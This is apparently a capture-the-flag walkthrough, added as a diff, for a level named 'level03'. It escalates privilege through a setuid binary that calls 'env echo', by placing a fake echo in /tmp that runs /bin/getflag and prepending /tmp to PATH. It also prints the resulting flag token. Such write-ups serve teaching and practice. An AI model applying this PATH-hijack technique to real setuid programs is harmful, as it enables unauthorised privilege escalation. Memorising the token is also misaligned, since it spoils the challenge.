@@ -1,0 +1,52 @@
+ls
+|
+L-> level03
+
+./level03
+|
+L-> Exploit me 
+
+executable file ? check the perm 
+
+ll
+|
+L-> -rwsr-sr-x 1 flag03 [...] level03
+
+the executable file is created by the user flag03 and we run it as him with the s byte 
+we cand try to do a suid exploit
+
+file level03
+|
+L-> level03: setuid setgid [...]
+
+bingo the executable set the uid of flag03 when executed
+
+but how this prog works ?
+
+strings level03
+|
+L-> /lib/ld-linux.so.2
+L->[...]
+L->/usr/bin/env echo Exploit me
+
+ohhh yeah the program just use the echo builtin from the env to print Exploit me 
+so we can recreate a fake echo cmd and add it to env
+
+what does this fake echo should do ? as it will be run as flag03, we just want him to return to us the flag
+with..... getflag ! (located in /bin/getflag)
+
+echo "/bin/getflag" > /tmp/echo
+
+chmod +x /tmp/echo
+
+export PATH=/tmp:$PATH
+
+the executable will be search in order in PATH var, so like this, the echo cmd will be search first in /tmp
+and THERE is an echo executable in it :D 
+so know if we re-execute the program:
+
+./level03
+|
+L-> Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+here it is :D the getflag have been launch as flag03 soooo we get the flag 
